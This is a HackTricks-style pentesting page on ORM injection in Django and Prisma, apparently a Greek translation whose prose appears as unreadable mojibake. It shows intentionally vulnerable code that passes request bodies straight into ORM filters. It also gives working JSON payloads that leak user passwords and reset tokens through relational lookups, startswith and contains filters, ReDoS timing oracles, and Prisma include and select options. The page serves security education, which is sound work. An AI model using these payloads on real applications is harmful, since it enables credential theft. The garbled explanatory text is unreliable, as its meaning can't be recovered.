# ORM Injection

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Django ORM (Python)

Î£Ï„Î¿ [**Î±Ï…Ï„ÏŒ Ï„Î¿ Î¬ÏÎ¸ÏÎ¿**](https://www.elttam.com/blog/plormbing-your-django-orm/) ÎµÎ¾Î·Î³ÎµÎ¯Ï„Î±Î¹ Ï€ÏÏ‚ ÎµÎ¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒÎ½ Î½Î± Î³Î¯Î½ÎµÎ¹ ÎµÏ…Î¬Î»Ï‰Ï„Î¿ Î­Î½Î± Django ORM Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Î³Î¹Î± Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± Î­Î½Î±Î½ ÎºÏÎ´Î¹ÎºÎ± ÏŒÏ€Ï‰Ï‚:

<pre class="language-python"><code class="lang-python">class ArticleView(APIView):
"""
Some basic API view that users send requests to for
searching for articles
"""
def post(self, request: Request, format=None):
try:
<strong>            articles = Article.objects.filter(**request.data)
</strong>            serializer = ArticleSerializer(articles, many=True)
except Exception as e:
return Response([])
return Response(serializer.data)
</code></pre>

Î£Î·Î¼ÎµÎ¹ÏÏƒÏ„Îµ Ï€ÏÏ‚ ÏŒÎ»Î± Ï„Î± request.data (Ï„Î± Î¿Ï€Î¿Î¯Î± Î¸Î± ÎµÎ¯Î½Î±Î¹ json) Ï€ÎµÏÎ½Î¬Î½Îµ Î±Ï€ÎµÏ…Î¸ÎµÎ¯Î±Ï‚ Î³Î¹Î± **Ï†Î¹Î»Ï„ÏÎ¬ÏÎ¹ÏƒÎ¼Î± Î±Î½Ï„Î¹ÎºÎµÎ¹Î¼Î­Î½Ï‰Î½ Î±Ï€ÏŒ Ï„Î· Î²Î¬ÏƒÎ· Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½**. ÎˆÎ½Î±Ï‚ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎµ Î½Î± ÏƒÏ„ÎµÎ¯Î»ÎµÎ¹ Î±Ï€ÏÎ¿ÏƒÎ´ÏŒÎºÎ·Ï„Î± Ï†Î¯Î»Ï„ÏÎ± Ï€ÏÎ¿ÎºÎµÎ¹Î¼Î­Î½Î¿Ï… Î½Î± Î´Î¹Î±ÏÏÎµÏÏƒÎ¿Ï…Î½ Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎ± Î´ÎµÎ´Î¿Î¼Î­Î½Î± Î±Ï€ÏŒ ÏŒ,Ï„Î¹ Î±Î½Î±Î¼ÎµÎ½ÏŒÏ„Î±Î½.

Î Î±ÏÎ±Î´ÎµÎ¯Î³Î¼Î±Ï„Î±:

* **Î£ÏÎ½Î´ÎµÏƒÎ·:** Î£Îµ Î¼Î¹Î± Î±Ï€Î»Î® ÏƒÏÎ½Î´ÎµÏƒÎ· Ï€ÏÎ¿ÏƒÏ€Î±Î¸Î®ÏƒÏ„Îµ Î½Î± Î´Î¹Î±ÏÏÎµÏÏƒÎµÏ„Îµ Ï„Î¿Ï…Ï‚ ÎºÏ‰Î´Î¹ÎºÎ¿ÏÏ‚ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚ Ï„Ï‰Î½ Ï‡ÏÎ·ÏƒÏ„ÏÎ½ Ï€Î¿Ï… ÎµÎ¯Î½Î±Î¹ ÎµÎ³Î³ÎµÎ³ÏÎ±Î¼Î¼Î­Î½Î¿Î¹ ÏƒÎµ Î±Ï…Ï„Î®Î½.
```json
{
"username": "admin",
"password_startswith":"a"
}
```
{% hint style="danger" %}
Î•Î¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒÎ½ Î½Î± Î³Î¯Î½ÎµÎ¹ brute-force ÏƒÏ„Î¿Î½ ÎºÏ‰Î´Î¹ÎºÏŒ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚ Î¼Î­Ï‡ÏÎ¹ Î½Î± Î´Î¹Î±ÏÏÎµÏÏƒÎµÎ¹.
{% endhint %}

* **Î£Ï‡ÎµÏƒÎ¹Î±ÎºÎ® Ï†Î¹Î»Ï„ÏÎ¬ÏÎ¹ÏƒÎ¼Î±**: Î•Î¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒÎ½ Î½Î± Î´Î¹Î±ÏƒÏ‡Î¯ÏƒÎµÏ„Îµ ÏƒÏ‡Î­ÏƒÎµÎ¹Ï‚ Ï€ÏÎ¿ÎºÎµÎ¹Î¼Î­Î½Î¿Ï… Î½Î± Î´Î¹Î±ÏÏÎµÏÏƒÎµÎ¹ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ Î±Ï€ÏŒ ÏƒÏ„Î®Î»ÎµÏ‚ Ï€Î¿Ï… Î´ÎµÎ½ Î±Î½Î±Î¼Î­Î½Î¿Î½Ï„Î±Î½ ÎºÎ±Î½ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î·Î¸Î¿ÏÎ½ ÏƒÏ„Î· Î´Î¹Î±Î´Î¹ÎºÎ±ÏƒÎ¯Î±. Î“Î¹Î± Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î±, Î±Î½ ÎµÎ¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒÎ½ Î½Î± Î´Î¹Î±ÏÏÎµÏÏƒÎ¿Ï…Î½ Î¬ÏÎ¸ÏÎ± Ï€Î¿Ï… Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®Î¸Î·ÎºÎ±Î½ Î±Ï€ÏŒ Î­Î½Î±Î½ Ï‡ÏÎ®ÏƒÏ„Î· Î¼Îµ Î±Ï…Ï„Î­Ï‚ Ï„Î¹Ï‚ ÏƒÏ‡Î­ÏƒÎµÎ¹Ï‚: Article(`created_by`) -\[1..1]-> Author (`user`) -\[1..1]-> User(`password`).
```json
{
"created_by__user__password__contains":"pass"
}
```
{% hint style="danger" %}
Î•Î¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒÎ½ Î½Î± Î²ÏÎµÎ¯Ï„Îµ Ï„Î¿Î½ ÎºÏ‰Î´Î¹ÎºÏŒ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚ ÏŒÎ»Ï‰Î½ Ï„Ï‰Î½ Ï‡ÏÎ·ÏƒÏ„ÏÎ½ Ï€Î¿Ï… Î­Ï‡Î¿Ï…Î½ Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÎ¹ Î­Î½Î± Î¬ÏÎ¸ÏÎ¿
{% endhint %}

* **Î Î¿Î»Î»ÏÎ½ Ï€ÏÎ¿Ï‚ Ï€Î¿Î»Î»Î¿ÏÏ‚ ÏƒÏ‡ÎµÏƒÎ¹Î±ÎºÏŒÏ‚ Ï†Î¹Î»Ï„ÏÎ¬ÏÎ¹ÏƒÎ¼Î±**: Î£Ï„Î¿ Ï€ÏÎ¿Î·Î³Î¿ÏÎ¼ÎµÎ½Î¿ Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± Î´ÎµÎ½ Î¼Ï€Î¿ÏÎ­ÏƒÎ±Î¼Îµ Î½Î± Î²ÏÎ¿ÏÎ¼Îµ Ï„Î¿Ï…Ï‚ ÎºÏ‰Î´Î¹ÎºÎ¿ÏÏ‚ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚ Ï‡ÏÎ·ÏƒÏ„ÏÎ½ Ï€Î¿Ï… Î´ÎµÎ½ Î­Ï‡Î¿Ï…Î½ Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÎ¹ Î­Î½Î± Î¬ÏÎ¸ÏÎ¿. Î©ÏƒÏ„ÏŒÏƒÎ¿, Î±ÎºÎ¿Î»Î¿Ï…Î¸ÏÎ½Ï„Î±Ï‚ Î¬Î»Î»ÎµÏ‚ ÏƒÏ‡Î­ÏƒÎµÎ¹Ï‚ Î±Ï…Ï„ÏŒ ÎµÎ¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒ. Î“Î¹Î± Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î±: Article(`created_by`) -\[1..1]-> Author(`departments`) -\[0..\*]-> Department(`employees`) -\[0..\*]-> Author(`user`) -\[1..1]-> User(`password`).
```json
{
"created_by__departments__employees__user_startswith":"admi"
}
```
{% hint style="danger" %}
Î£Îµ Î±Ï…Ï„Î® Ï„Î·Î½ Ï€ÎµÏÎ¯Ï€Ï„Ï‰ÏƒÎ· Î¼Ï€Î¿ÏÎ¿ÏÎ¼Îµ Î½Î± Î²ÏÎ¿ÏÎ¼Îµ ÏŒÎ»Î¿Ï…Ï‚ Ï„Î¿Ï…Ï‚ Ï‡ÏÎ®ÏƒÏ„ÎµÏ‚ ÏƒÏ„Î± Ï„Î¼Î®Î¼Î±Ï„Î± Ï‡ÏÎ·ÏƒÏ„ÏÎ½ Ï€Î¿Ï… Î­Ï‡Î¿Ï…Î½ Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÎ¹ Î¬ÏÎ¸ÏÎ± ÎºÎ±Î¹ ÏƒÏ„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î± Î½Î± Î´Î¹Î±ÏÏÎµÏÏƒÎ¿Ï…Î¼Îµ Ï„Î¿Ï…Ï‚ ÎºÏ‰Î´Î¹ÎºÎ¿ÏÏ‚ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ®Ï‚ Ï„Î¿Ï…Ï‚ (ÏƒÏ„Î¿ Ï€ÏÎ¿Î·Î³Î¿ÏÎ¼ÎµÎ½Î¿ json Î´Î¹Î±ÏÏÎ­Î¿Ï…Î¼Îµ Î¼ÏŒÎ½Î¿ Ï„Î± Î¿Î½ÏŒÎ¼Î±Ï„Î± Ï‡ÏÎ·ÏƒÏ„ÏÎ½ Î±Î»Î»Î¬ ÏƒÏ„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î± ÎµÎ¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒ Î½Î± Î´Î¹Î±ÏÏÎµÏÏƒÎ¿Ï…Î¼Îµ Ï„Î¿Ï…Ï‚ ÎºÏ‰Î´Î¹ÎºÎ¿ÏÏ‚ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚).
{% endhint %}

* **ÎšÎ±Ï„Î¬Ï‡ÏÎ·ÏƒÎ· Ï„Ï‰Î½ ÏƒÏ‡Î­ÏƒÎµÏ‰Î½ Ï€Î¿Î»Î»ÏÎ½ Ï€ÏÎ¿Ï‚ Ï€Î¿Î»Î»Î¿ÏÏ‚ Ï„Î¿Ï… Django Group ÎºÎ±Î¹ Permission Î¼Îµ Ï„Î¿Ï…Ï‚ Ï‡ÏÎ®ÏƒÏ„ÎµÏ‚**: Î•Ï€Î¹Ï€Î»Î­Î¿Î½, Ï„Î¿ Î¼Î¿Î½Ï„Î­Î»Î¿ AbstractUser Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹ Î³Î¹Î± Ï„Î· Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î¯Î± Ï‡ÏÎ·ÏƒÏ„ÏÎ½ ÏƒÏ„Î¿ Django ÎºÎ±Î¹ Î±Ï€ÏŒ Ï€ÏÎ¿ÎµÏ€Î¹Î»Î¿Î³Î® Î±Ï…Ï„ÏŒ Ï„Î¿ Î¼Î¿Î½Ï„Î­Î»Î¿ Î­Ï‡ÎµÎ¹ ÎºÎ¬Ï€Î¿Î¹ÎµÏ‚ **Ï€Î¿Î»Î»Î­Ï‚ Ï€ÏÎ¿Ï‚ Ï€Î¿Î»Î»Î­Ï‚ ÏƒÏ‡Î­ÏƒÎµÎ¹Ï‚ Î¼Îµ Ï„Î¿Ï…Ï‚ Ï€Î¯Î½Î±ÎºÎµÏ‚ Permission ÎºÎ±Î¹ Group**. Î Î¿Ï… Î²Î±ÏƒÎ¹ÎºÎ¬ ÎµÎ¯Î½Î±Î¹ Î­Î½Î±Ï‚ Ï€ÏÎ¿ÎµÏ€Î¹Î»ÎµÎ³Î¼Î­Î½Î¿Ï‚ Ï„ÏÏŒÏ€Î¿Ï‚ Î³Î¹Î± **Î½Î± Î±Ï€Î¿ÎºÏ„Î®ÏƒÎµÏ„Îµ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎµ Î¬Î»Î»Î¿Ï…Ï‚ Ï‡ÏÎ®ÏƒÏ„ÎµÏ‚ Î±Ï€ÏŒ Î­Î½Î±Î½ Ï‡ÏÎ®ÏƒÏ„Î·** Î±Î½ ÎµÎ¯Î½Î±Î¹ ÏƒÏ„Î·Î½ **Î¯Î´Î¹Î± Î¿Î¼Î¬Î´Î± Î® Î¼Î¿Î¹ÏÎ¬Î¶Î¿Î½Ï„Î±Î¹ Ï„Î·Î½ Î¯Î´Î¹Î± Î¬Î´ÎµÎ¹Î±**.
```bash
# By users in the same group
created_by__user__groups__user__password

# By users with the same permission
created_by__user__user_permissions__user__password
```
* **Î Î±ÏÎ¬ÎºÎ±Î¼ÏˆÎ· Ï€ÎµÏÎ¹Î¿ÏÎ¹ÏƒÎ¼ÏÎ½ Ï†Î¯Î»Ï„ÏÏ‰Î½**: Î— Î¯Î´Î¹Î± Î±Î½Î¬ÏÏ„Î·ÏƒÎ· Ï€ÏÏŒÏ„ÎµÎ¹Î½Îµ Î½Î± Ï€Î±ÏÎ±ÎºÎ±Î¼Ï†Î¸ÎµÎ¯ Î· Ï‡ÏÎ®ÏƒÎ· ÎºÎ¬Ï€Î¿Î¹Ï‰Î½ Ï†Î¯Î»Ï„ÏÏ‰Î½ ÏŒÏ€Ï‰Ï‚ `articles = Article.objects.filter(is_secret=False, **request.data)`. Î•Î¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒÎ½ Î½Î± ÎµÎ¾Î¬Î³Î¿Ï…Î¼Îµ Î¬ÏÎ¸ÏÎ± Ï€Î¿Ï… Î­Ï‡Î¿Ï…Î½ is\_secret=True ÎµÏ€ÎµÎ¹Î´Î® Î¼Ï€Î¿ÏÎ¿ÏÎ¼Îµ Î½Î± ÎµÏ€Î±Î½Î±Î»Î¬Î²Î¿Ï…Î¼Îµ Î±Ï€ÏŒ Î¼Î¹Î± ÏƒÏ‡Î­ÏƒÎ· ÏƒÏ„Î¿Î½ Ï€Î¯Î½Î±ÎºÎ± Article ÎºÎ±Î¹ Î½Î± Î´Î¹Î±ÏÏÎµÏÏƒÎ¿Ï…Î¼Îµ Î¼Ï…ÏƒÏ„Î¹ÎºÎ¬ Î¬ÏÎ¸ÏÎ± Î±Ï€ÏŒ Î¼Î· Î¼Ï…ÏƒÏ„Î¹ÎºÎ¬ Î¬ÏÎ¸ÏÎ± ÎµÏ€ÎµÎ¹Î´Î® Ï„Î± Î±Ï€Î¿Ï„ÎµÎ»Î­ÏƒÎ¼Î±Ï„Î± ÎµÎ¯Î½Î±Î¹ ÏƒÏ…Î½Î´ÎµÎ´ÎµÎ¼Î­Î½Î± ÎºÎ±Î¹ Ï„Î¿ Ï€ÎµÎ´Î¯Î¿ is\_secret ÎµÎ»Î­Î³Ï‡ÎµÏ„Î±Î¹ ÏƒÏ„Î¿ Î¼Î· Î¼Ï…ÏƒÏ„Î¹ÎºÏŒ Î¬ÏÎ¸ÏÎ¿ ÎµÎ½Ï Ï„Î± Î´ÎµÎ´Î¿Î¼Î­Î½Î± Î´Î¹Î±ÏÏÎ­Î¿Ï…Î½ Î±Ï€ÏŒ Ï„Î¿ Î¼Ï…ÏƒÏ„Î¹ÎºÏŒ Î¬ÏÎ¸ÏÎ¿.
```bash
Article.objects.filter(is_secret=False, categories__articles__id=2)
```
{% hint style="danger" %}
ÎšÎ±Ï„Î±Ï‡ÏÏÎ½Ï„Î±Ï‚ Ï„Î¹Ï‚ ÏƒÏ‡Î­ÏƒÎµÎ¹Ï‚, ÎµÎ¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒÎ½ Î½Î± Ï€Î±ÏÎ±ÎºÎ±Î¼Ï†Î¸Î¿ÏÎ½ Î±ÎºÏŒÎ¼Î· ÎºÎ±Î¹ Ï„Î± Ï†Î¯Î»Ï„ÏÎ± Ï€Î¿Ï… Ï€ÏÎ¿Î¿ÏÎ¯Î¶Î¿Î½Ï„Î±Î¹ Î³Î¹Î± Ï„Î·Î½ Ï€ÏÎ¿ÏƒÏ„Î±ÏƒÎ¯Î± Ï„Ï‰Î½ Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½ Ï€Î¿Ï… ÎµÎ¼Ï†Î±Î½Î¯Î¶Î¿Î½Ï„Î±Î¹.
{% endhint %}

* **Error/Time based via ReDoS**: Î£Ï„Î± Ï€ÏÎ¿Î·Î³Î¿ÏÎ¼ÎµÎ½Î± Ï€Î±ÏÎ±Î´ÎµÎ¯Î³Î¼Î±Ï„Î± Î±Î½Î±Î¼ÎµÎ½ÏŒÏ„Î±Î½ Î½Î± Î­Ï‡Î¿Ï…Î¼Îµ Î´Î¹Î±Ï†Î¿ÏÎµÏ„Î¹ÎºÎ­Ï‚ Î±Ï€Î±Î½Ï„Î®ÏƒÎµÎ¹Ï‚ Î±Î½ Ï„Î¿ Ï†Î¯Î»Ï„ÏÎ¿ Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¿ÏÏƒÎµ Î® ÏŒÏ‡Î¹ Î³Î¹Î± Î½Î± Ï„Î¿ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎ¿Ï…Î¼Îµ Ï‰Ï‚ Î¼Î¬Î½Ï„Î·. Î‘Î»Î»Î¬ Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎµ Î½Î± ÎµÎ¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒÎ½ Î½Î± ÎµÎºÏ„ÎµÎ»ÎµÎ¯Ï„Î±Î¹ ÎºÎ¬Ï€Î¿Î¹Î± ÎµÎ½Î­ÏÎ³ÎµÎ¹Î± ÏƒÏ„Î· Î²Î¬ÏƒÎ· Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½ ÎºÎ±Î¹ Î· Î±Ï€Î¬Î½Ï„Î·ÏƒÎ· Î½Î± ÎµÎ¯Î½Î±Î¹ Ï€Î¬Î½Ï„Î± Î· Î¯Î´Î¹Î±. Î£Îµ Î±Ï…Ï„ÏŒ Ï„Î¿ ÏƒÎµÎ½Î¬ÏÎ¹Î¿, Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎµ Î½Î± ÎµÎ¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒÎ½ Î½Î± Ï€ÏÎ¿ÎºÎ±Î»Î­ÏƒÎ¿Ï…Î¼Îµ ÏƒÏ†Î¬Î»Î¼Î± ÏƒÏ„Î· Î²Î¬ÏƒÎ· Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½ Î³Î¹Î± Î½Î± Î±Ï€Î¿ÎºÏ„Î®ÏƒÎ¿Ï…Î¼Îµ Î­Î½Î±Î½ Î½Î­Î¿ Î¼Î¬Î½Ï„Î·.
```json
// Non matching password
{
"created_by__user__password__regex": "^(?=^pbkdf1).*.*.*.*.*.*.*.*!!!!$"
}

// ReDoS matching password (will show some error in the response or check the time)
{"created_by__user__password__regex": "^(?=^pbkdf2).*.*.*.*.*.*.*.*!!!!$"}
```
Î‘Ï€ÏŒ Ï„Î·Î½ Î¯Î´Î¹Î± Î±Î½Î¬ÏÏ„Î·ÏƒÎ· ÏƒÏ‡ÎµÏ„Î¹ÎºÎ¬ Î¼Îµ Î±Ï…Ï„ÏŒ Ï„Î¿ vector:

* **SQLite**: Î”ÎµÎ½ Î­Ï‡ÎµÎ¹ Î­Î½Î±Î½ ÎºÎ±Î½Î¿Î½Î¹ÎºÏŒ ÎµÎºÏ†ÏÎ±ÏƒÏ„Î® (regexp) Î±Ï€ÏŒ Ï€ÏÎ¿ÎµÏ€Î¹Î»Î¿Î³Î® (Î±Ï€Î±Î¹Ï„ÎµÎ¯ Ï†ÏŒÏÏ„Ï‰ÏƒÎ· Ï„ÏÎ¯Ï„Î¿Ï… Î¼Î­ÏÎ¿Ï…Ï‚ ÎµÏ€Î­ÎºÏ„Î±ÏƒÎ·Ï‚)
* **PostgreSQL**: Î”ÎµÎ½ Î­Ï‡ÎµÎ¹ Ï€ÏÎ¿ÎµÏ€Î¹Î»ÎµÎ³Î¼Î­Î½Î¿ Ï‡ÏÎ¿Î½Î¹ÎºÏŒ ÏŒÏÎ¹Î¿ regex ÎºÎ±Î¹ ÎµÎ¯Î½Î±Î¹ Î»Î¹Î³ÏŒÏ„ÎµÏÎ¿ ÎµÏ€Î¹ÏÏÎµÏ€Î­Ï‚ ÏƒÎµ backtracking
* **MariaDB**: Î”ÎµÎ½ Î­Ï‡ÎµÎ¹ Ï‡ÏÎ¿Î½Î¹ÎºÏŒ ÏŒÏÎ¹Î¿ regex

## Prisma ORM (NodeJS)

Î¤Î± Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ ÎµÎ¯Î½Î±Î¹ [**ÎºÏŒÎ»Ï€Î± Ï€Î¿Ï… ÎµÎ¾Î¬Î³Î¿Î½Ï„Î±Î¹ Î±Ï€ÏŒ Î±Ï…Ï„Î® Ï„Î·Î½ Î±Î½Î¬ÏÏ„Î·ÏƒÎ·**](https://www.elttam.com/blog/plorming-your-primsa-orm/).

* **Î Î»Î®ÏÎ·Ï‚ Î­Î»ÎµÎ³Ï‡Î¿Ï‚ ÎµÏÏÎµÏƒÎ·Ï‚**:

<pre class="language-javascript"><code class="lang-javascript">const app = express();

app.use(express.json());

app.post('/articles/verybad', async (req, res) => {
try {
// ÎŸ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Î­Ï‡ÎµÎ¹ Ï€Î»Î®ÏÎ· Î­Î»ÎµÎ³Ï‡Î¿ ÏŒÎ»Ï‰Î½ Ï„Ï‰Î½ ÎµÏ€Î¹Î»Î¿Î³ÏÎ½ prisma
<strong>        const posts = await prisma.article.findMany(req.body.filter)
</strong>        res.json(posts);
} catch (error) {
res.json([]);
}
});
</code></pre>

Î•Î¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒÎ½ Î½Î± Î´Î¿ÏÎ¼Îµ ÏŒÏ„Î¹ Î¿Î»ÏŒÎºÎ»Î·ÏÎ¿ Ï„Î¿ ÏƒÏÎ¼Î± javascript Ï€ÎµÏÎ½Î¬ÎµÎ¹ ÏƒÏ„Î¿ prisma Î³Î¹Î± Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÎ¹ ÎµÏÏ‰Ï„Î®Î¼Î±Ï„Î±.

Î£Ï„Î¿ Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± Î±Ï€ÏŒ Ï„Î·Î½ Î±ÏÏ‡Î¹ÎºÎ® Î±Î½Î¬ÏÏ„Î·ÏƒÎ·, Î±Ï…Ï„ÏŒ Î¸Î± ÎµÎ»Î­Î³Î¾ÎµÎ¹ ÏŒÎ»ÎµÏ‚ Ï„Î¹Ï‚ Î±Î½Î±ÏÏ„Î®ÏƒÎµÎ¹Ï‚ Ï€Î¿Ï… Î­Ï‡Î¿Ï…Î½ Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î·Î¸ÎµÎ¯ Î±Ï€ÏŒ ÎºÎ¬Ï€Î¿Î¹Î¿Î½ (ÎºÎ¬Î¸Îµ Î±Î½Î¬ÏÏ„Î·ÏƒÎ· Î´Î·Î¼Î¹Î¿Ï…ÏÎ³ÎµÎ¯Ï„Î±Î¹ Î±Ï€ÏŒ ÎºÎ¬Ï€Î¿Î¹Î¿Î½) ÎµÏ€Î¹ÏƒÏ„ÏÎ­Ï†Î¿Î½Ï„Î±Ï‚ ÎµÏ€Î¯ÏƒÎ·Ï‚ Ï„Î¹Ï‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ Ï‡ÏÎ®ÏƒÏ„Î· Î±Ï…Ï„Î¿Ï Ï„Î¿Ï… ÎºÎ¬Ï€Î¿Î¹Î¿Ï… (ÏŒÎ½Î¿Î¼Î± Ï‡ÏÎ®ÏƒÏ„Î·, ÎºÏ‰Î´Î¹ÎºÏŒÏ‚ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚...)
```json
{
"filter": {
"include": {
"createdBy": true
}
}
}

// Response
[
{
"id": 1,
"title": "Buy Our Essential Oils",
"body": "They are very healthy to drink",
"published": true,
"createdById": 1,
"createdBy": {
"email": "karen@example.com",
"id": 1,
"isAdmin": false,
"name": "karen",
"password": "super secret passphrase",
"resetToken": "2eed5e80da4b7491"
}
},
...
]
```
ÎŸ Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ ÎµÏ€Î¹Î»Î­Î³ÎµÎ¹ ÏŒÎ»ÎµÏ‚ Ï„Î¹Ï‚ Î±Î½Î±ÏÏ„Î®ÏƒÎµÎ¹Ï‚ Ï€Î¿Ï… Î­Ï‡Î¿Ï…Î½ Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î·Î¸ÎµÎ¯ Î±Ï€ÏŒ ÎºÎ¬Ï€Î¿Î¹Î¿Î½ Î¼Îµ ÎºÏ‰Î´Î¹ÎºÏŒ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚ ÎºÎ±Î¹ Î¸Î± ÎµÏ€Î¹ÏƒÏ„ÏÎ­ÏˆÎµÎ¹ Ï„Î¿Î½ ÎºÏ‰Î´Î¹ÎºÏŒ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚:
```json
{
"filter": {
"select": {
"createdBy": {
"select": {
"password": true
}
}
}
}
}

// Response
[
{
"createdBy": {
"password": "super secret passphrase"
}
},
...
]
```
* **Î Î»Î®ÏÎ·Ï‚ Î­Î»ÎµÎ³Ï‡Î¿Ï‚ Ï„Î·Ï‚ ÏÎ®Ï„ÏÎ±Ï‚ where**:

Î‘Ï‚ ÏÎ¯Î¾Î¿Ï…Î¼Îµ Î¼Î¹Î± Î¼Î±Ï„Î¹Î¬ ÏƒÎµ Î±Ï…Ï„ÏŒ ÏŒÏ€Î¿Ï… Î· ÎµÏ€Î¯Î¸ÎµÏƒÎ· Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÎ»Î­Î³Î¾ÎµÎ¹ Ï„Î· ÏÎ®Ï„ÏÎ± `where`:

<pre class="language-javascript"><code class="lang-javascript">app.get('/articles', async (req, res) => {
try {
const posts = await prisma.article.findMany({
<strong>            where: req.query.filter as any // Î•Ï…Î¬Î»Ï‰Ï„Î¿ ÏƒÎµ ORM Leaks
</strong>        })
res.json(posts);
} catch (error) {
res.json([]);
}
});
</code></pre>

Î•Î¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒÎ½ Î½Î± Ï†Î¹Î»Ï„ÏÎ¬ÏÎ¿Ï…Î¼Îµ Ï„Î¿Î½ ÎºÏ‰Î´Î¹ÎºÏŒ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚ Ï„Ï‰Î½ Ï‡ÏÎ·ÏƒÏ„ÏÎ½ Î±Ï€ÎµÏ…Î¸ÎµÎ¯Î±Ï‚ ÏŒÏ€Ï‰Ï‚:
```javascript
await prisma.article.findMany({
where: {
createdBy: {
password: {
startsWith: "pas"
}
}
}
})
```
{% hint style="danger" %}
Î§ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯ÎµÏ‚ ÏŒÏ€Ï‰Ï‚ Ï„Î¿ `startsWith`, ÎµÎ¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒÎ½ Î½Î± Î´Î¹Î±ÏÏÎµÏÏƒÎµÎ¹ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯Î±.&#x20;
{% endhint %}

